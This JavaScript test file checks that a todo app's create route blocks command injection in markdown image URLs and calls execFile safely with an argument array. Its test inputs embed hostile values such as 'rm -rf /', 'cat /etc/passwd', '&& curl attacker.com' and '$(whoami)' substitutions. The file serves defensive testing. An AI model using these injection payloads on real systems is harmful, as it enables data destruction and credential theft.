const assert = require('assert');
const sinon = require('sinon');
const proxyquire = require('proxyquire');

describe('Command Injection Prevention Tests', () => {
  describe('create endpoint - image URL processing', () => {
    let execFileStub;
    let validatorStub;
    let consoleLogStub;
    let routesModule;
    let req, res, next;

    beforeEach(() => {
      // Stub execFile to prevent actual command execution
      execFileStub = sinon.stub();

      // Stub console.log to capture logging
      consoleLogStub = sinon.stub(console, 'log');

      // Mock dependencies
      const childProcessStub = {
        exec: sinon.stub(),
        execFile: execFileStub
      };

      const validatorMock = {
        isURL: sinon.stub(),
        isEmail: sinon.stub(),
        isMobilePhone: sinon.stub(),
        isAscii: sinon.stub(),
        rtrim: sinon.stub().returnsArg(0)
      };

      const mongooseMock = {
        model: sinon.stub().returns({
          find: sinon.stub().returns({
            sort: sinon.stub().returns({
              exec: sinon.stub()
            })
          })
        })
      };

      const TodoMock = function(data) {
        this.save = sinon.stub().yields(null, data, 1);
        return this;
      };

      mongooseMock.model.withArgs('Todo').returns(TodoMock);
      mongooseMock.model.withArgs('User').returns({});

      // Load routes with stubs
      routesModule = proxyquire('../routes/index', {
        'child_process': childProcessStub,
        'validator': validatorMock,
        'mongoose': mongooseMock,
        '../utils': {}
      });

      validatorStub = validatorMock;

      // Setup request/response mocks
      req = {
        body: {},
        params: {},
        session: {}
      };

      res = {
        render: sinon.stub(),
        redirect: sinon.stub(),
        setHeader: sinon.stub(),
        status: sinon.stub().returns({ send: sinon.stub() }),
        send: sinon.stub()
      };

      next = sinon.stub();
    });

    afterEach(() => {
      consoleLogStub.restore();
      sinon.restore();
    });

    test('should reject URL with command injection attempt using semicolon', () => {
      // GIVEN - malicious payload with semicolon command separator
      const maliciousContent = '![alt text](http://example.com/image.jpg; rm -rf / " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject malicious URL
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with malicious input');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'),
        'Should log invalid URL message');
    });

    test('should reject URL with command injection attempt using backticks', () => {
      // GIVEN - malicious payload with backtick command execution
      const maliciousContent = '![alt text](http://example.com/`whoami` " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject malicious URL
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with backtick injection');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should reject URL with command injection attempt using pipe operator', () => {
      // GIVEN - malicious payload with pipe operator
      const maliciousContent = '![alt text](http://example.com/image.jpg | cat /etc/passwd " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject malicious URL
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with pipe injection');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should reject URL with command injection attempt using double ampersand', () => {
      // GIVEN - malicious payload with && command chaining
      const maliciousContent = '![alt text](http://example.com/image.jpg && curl attacker.com " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject malicious URL
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with && injection');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should reject URL with command injection attempt using $() substitution', () => {
      // GIVEN - malicious payload with $() command substitution
      const maliciousContent = '![alt text](http://example.com/$(malicious-command) " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject malicious URL
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with $() injection');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should reject non-HTTP(S) protocols to prevent file:// or other schemes', () => {
      // GIVEN - attempt to use file:// protocol
      const maliciousContent = '![alt text](file:///etc/passwd " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject non-HTTP protocol
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false, 'execFile should not be called with file:// protocol');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should accept valid HTTP URL and use execFile safely', () => {
      // GIVEN - legitimate HTTP URL
      const validContent = '![alt text](http://example.com/image.jpg " "caption")';
      req.body.content = validContent;

      // Mock validator to accept valid URL
      validatorStub.isURL.withArgs('http://example.com/image.jpg',
        { protocols: ['http', 'https'], require_protocol: true }).returns(true);

      // Stub execFile to succeed
      execFileStub.yields(null, 'image info', '');

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should be called with safe parameters
      assert.strictEqual(execFileStub.calledOnce, true, 'execFile should be called once');

      const execFileArgs = execFileStub.firstCall.args;
      assert.strictEqual(execFileArgs[0], 'identify', 'First argument should be the command');
      assert(Array.isArray(execFileArgs[1]), 'Second argument should be an array');
      assert.strictEqual(execFileArgs[1][0], 'http://example.com/image.jpg',
        'URL should be passed as array element');

      assert(consoleLogStub.calledWith('found img: http://example.com/image.jpg'),
        'Should log the valid URL');
    });

    test('should accept valid HTTPS URL and use execFile safely', () => {
      // GIVEN - legitimate HTTPS URL
      const validContent = '![alt text](https://secure.example.com/photo.png " "caption")';
      req.body.content = validContent;

      // Mock validator to accept valid URL
      validatorStub.isURL.withArgs('https://secure.example.com/photo.png',
        { protocols: ['http', 'https'], require_protocol: true }).returns(true);

      // Stub execFile to succeed
      execFileStub.yields(null, 'image info', '');

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should be called with safe parameters
      assert.strictEqual(execFileStub.calledOnce, true, 'execFile should be called once');

      const execFileArgs = execFileStub.firstCall.args;
      assert.strictEqual(execFileArgs[0], 'identify', 'First argument should be the command');
      assert(Array.isArray(execFileArgs[1]), 'Second argument should be an array');
      assert.strictEqual(execFileArgs[1][0], 'https://secure.example.com/photo.png',
        'URL should be passed as array element');
    });

    test('should handle execFile errors gracefully', () => {
      // GIVEN - valid URL but execFile fails
      const validContent = '![alt text](http://example.com/image.jpg " "caption")';
      req.body.content = validContent;

      // Mock validator to accept valid URL
      validatorStub.isURL.returns(true);

      // Stub execFile to fail
      const testError = new Error('Command failed');
      execFileStub.yields(testError, '', 'error details');

      // WHEN
      routesModule.create(req, res, next);

      // THEN - should handle error without crashing
      assert.strictEqual(execFileStub.calledOnce, true, 'execFile should be called');
      assert(consoleLogStub.calledWith(testError), 'Should log the error');
      assert(consoleLogStub.calledWith('Error (' + testError + '):error details'),
        'Should log error details');
    });

    test('should process non-image content without calling execFile', () => {
      // GIVEN - regular todo content without image
      const regularContent = 'Buy groceries';
      req.body.content = regularContent;

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false,
        'execFile should not be called for non-image content');
    });

    test('should use execFile with argument array, not string concatenation', () => {
      // GIVEN - valid URL
      const validContent = '![alt text](http://example.com/test.jpg " "caption")';
      req.body.content = validContent;

      // Mock validator to accept valid URL
      validatorStub.isURL.returns(true);
      execFileStub.yields(null, '', '');

      // WHEN
      routesModule.create(req, res, next);

      // THEN - verify execFile is called with array, preventing concatenation
      assert.strictEqual(execFileStub.calledOnce, true);
      const execFileArgs = execFileStub.firstCall.args;

      // Verify command and arguments are separate
      assert.strictEqual(typeof execFileArgs[0], 'string', 'Command should be a string');
      assert(Array.isArray(execFileArgs[1]),
        'Arguments must be an array to prevent command injection');
      assert.strictEqual(execFileArgs[1].length, 1,
        'Should have exactly one argument (the URL)');

      // Verify no shell metacharacters would be interpreted
      // because execFile doesn't spawn a shell
      assert.notStrictEqual(execFileArgs[0].includes(' '), true,
        'Command should not contain spaces or concatenated arguments');
    });

    test('should reject URL with null bytes', () => {
      // GIVEN - URL with null byte injection attempt
      const maliciousContent = '![alt text](http://example.com/image.jpg\x00.txt " "caption")';
      req.body.content = maliciousContent;

      // Mock validator to reject URL with null bytes
      validatorStub.isURL.returns(false);

      // WHEN
      routesModule.create(req, res, next);

      // THEN - execFile should NOT be called
      assert.strictEqual(execFileStub.called, false,
        'execFile should not be called with null byte injection');
      assert(consoleLogStub.calledWith('Invalid URL format, skipping image identification'));
    });

    test('should validate URL before any processing occurs', () => {
      // GIVEN - potentially malicious URL
      const suspiciousContent = '![alt text](http://evil.com/$(whoami) " "caption")';
      req.body.content = suspiciousContent;

      let validatorCalled = false;
      let execFileCalled = false;

      validatorStub.isURL.callsFake(function() {
        validatorCalled = true;
        return false;
      });

      execFileStub.callsFake(function() {
        execFileCalled = true;
      });

      // WHEN
      routesModule.create(req, res, next);

      // THEN - validator must be called before execFile
      assert.strictEqual(validatorCalled, true, 'Validator should be called');
      assert.strictEqual(execFileCalled, false,
        'execFile should not be called if validation fails');
    });
  });
});
